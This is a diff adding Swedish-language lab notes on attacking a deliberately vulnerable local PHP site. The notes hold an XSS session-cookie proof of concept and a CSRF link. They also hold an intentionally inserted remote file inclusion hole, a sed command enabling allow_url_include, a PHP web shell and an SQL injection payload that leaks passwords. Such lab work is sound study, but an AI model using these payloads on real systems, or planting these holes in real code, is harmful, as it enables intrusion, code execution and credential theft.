@@ -1,0 +1,46 @@
+XSS:
+ injection:
+ 	1: försvaga hemsida genom att ta bort htmlspecialchars funkar
+ 	2: inte lyckats lura browser att byta charset för att komma runt htmlspecialchars
+ attack:
+
+ 	steal session id POC: lägg i gb:
+ 	<script>
+		alert(document.cookie.match(/PHPSESSID=[^;]+/));
+	</script>
+
+CSRF:
+
+	skicka länk:inget skydd mot csrf
+	skicka länk
+	https://localhost/vulnweb/index.php?comment=haha&submit=Comment&content=guestbook
+
+Remote File Inclusion:
+
+	öppna upp sårbarhet i index.php:
+		include($_GET['content'] . ".php");
+
+	öppna upp sårbarhet i php.ini:
+		sudo sed -i '825s/.*/allow_url_include = On/' /etc/php5/apache2/php.ini 
+	lägg upp script på annan server:
+		<!--
+			<script>
+        		alert("download this fancy program to use webpage");
+			</script>
+		-->
+		<?php echo "<?php"; ?>
+		
+		system($_GET['cmd']);
+
+	
+
+	
+
+SQL-Injection
+	
+	skriv en kommentar:
+		pass leak'); insert into comments(comment) VALUES((select pwd from users where uname = 'USERNAME'));--
+
+		USERNAME = ett användarnamn i databasen
+		
+
